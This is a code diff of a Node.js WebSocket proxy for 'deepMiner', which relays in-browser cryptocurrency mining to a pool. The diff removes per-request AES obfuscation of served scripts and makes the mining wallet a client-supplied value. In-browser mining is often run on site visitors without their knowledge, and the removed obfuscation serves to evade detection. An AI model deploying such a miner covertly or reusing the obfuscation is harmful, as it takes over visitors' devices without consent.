@@ -10,66 +10,31 @@ var http = require('http'),
     WebSocket = require("ws"),
     net = require('net'),
     fs = require('fs'),
-    crypto = require("crypto"),
-    CryptoJS = require(__dirname + '/crypto-js-3.1.9');
+    crypto = require("crypto");
 
-var conf = JSON.parse(fs.readFileSync(__dirname + '/config.json', 'utf8'));
+var banner = fs.readFileSync(__dirname + '/banner', 'utf8');
+var conf = fs.readFileSync(__dirname + '/config.json', 'utf8');
+conf = JSON.parse(conf);
 
 //ssl support
 const ssl = !!(conf.key && conf.cert);
 
-//heroku global config
+//heroku port
 conf.lport = process.env.PORT || conf.lport;
 conf.domain = process.env.DOMAIN || conf.domain;
-conf.pool = process.env.POOL || conf.pool;
-conf.addr = process.env.ADDR || conf.addr;
-
-// crypto for AES
-function rand(n) {
-    var chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
-    var res = "";
-    for (var i = 0; i < n; i++) {
-        var id = Math.ceil(Math.random() * 35);
-        res += chars[id];
-    }
-    return res;
-}
-
-function enAES(key, str) {
-    var encrypt = CryptoJS.AES.encrypt(str, CryptoJS.enc.Utf8.parse(key), {
-        mode: CryptoJS.mode.ECB,
-        padding: CryptoJS.pad.Pkcs7
-    });
-    return encrypt.toString();
-}
-
-function deAES(key, str) {
-    var decrypt = CryptoJS.AES.decrypt(str, CryptoJS.enc.Utf8.parse(key), {
-        mode: CryptoJS.mode.ECB,
-        padding: CryptoJS.pad.Pkcs7
-    });
-    return decrypt.toString(CryptoJS.enc.Utf8);
-}
 
 const stats = (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     req.url = (req.url === '/') ? '/index.html' : req.url;
     fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
         if (err) {
-            res.writeHead(301, {
-                'Location': 'https://' + conf.domain
+            fs.readFile(__dirname + '/web/404.html', (err, buf) => {
+                res.end(buf);
             });
-            res.end();
         } else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                 buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
                 if (req.url.match(/\.js$/)) {
-                    var randKey = rand(32);
-                    tmp = fs.readFileSync(__dirname + '/tmpl.aes.min.js', 'utf8');
-                    tmp = tmp.replace(/%aes_file%/g, enAES(randKey, buf));
-                    tmp = tmp.replace(/%aes_key%/g, randKey);
-                    buf = fs.readFileSync(__dirname + '/crypto-js-3.1.9.min.js', 'utf8');
-                    buf += tmp;
                     res.setHeader('content-type', 'application/javascript');
                 }
             } else {
@@ -93,7 +58,7 @@ if (ssl) {
 // Miner Proxy Srv
 var srv = new WebSocket.Server({
     server: web,
-    path: "/api",
+    path: "/proxy",
     maxPayload: 256
 });
 srv.on('connection', (ws) => {
@@ -113,6 +78,7 @@ srv.on('connection', (ws) => {
     function ws2pool(data) {
         var buf;
         data = JSON.parse(data);
+        console.log('wallet address: ' + data.params.wallet);
         switch (data.type) {
             case 'auth':
                 {
@@ -123,7 +89,13 @@ srv.on('connection', (ws) => {
                     buf = {
                         "method": "login",
                         "params": {
-                            "login": conf.addr,
+                            //commented by rnel for dynamic wallet address
+                            //"login": conf.addr,
+
+                            //added rnel
+                            "login": data.params.wallet,
+                            //end rnel
+
                             "pass": conf.pass,
                             "agent": "deepMiner"
                         },
@@ -215,9 +187,7 @@ srv.on('connection', (ws) => {
                 buf = JSON.stringify(buf);
                 conn.ws.send(buf);
             }
-        } catch (error) {
-            console.warn('[!] Error: ' + error.message)
-        }
+        } catch (error) { console.warn('[!] Error: '+error.message) }
     }
     conn.ws.on('message', (data) => {
         ws2pool(data);
@@ -231,7 +201,7 @@ srv.on('connection', (ws) => {
         console.log('[!] ' + conn.uid + ' offline.\n');
         conn.pl.destroy();
     });
-    conn.pl.on('data', function (data) {
+    conn.pl.on('data', function(data) {
         var linesdata = data;
         var lines = String(linesdata).split("\n");
         if (lines[1].length > 0) {
@@ -257,4 +227,8 @@ srv.on('connection', (ws) => {
         }
     });
 });
-web.listen(conf.lport, conf.lhost);
+web.listen(conf.lport, conf.lhost, () => {
+    console.log(banner);
+    console.log(' Listen on : ' + conf.lhost + ':' + conf.lport + '\n Pool Host : ' + conf.pool + '\n Ur Wallet : ' + conf.addr + '\n');
+    console.log('----------------------------------------------------------------------------------------\n');
+});
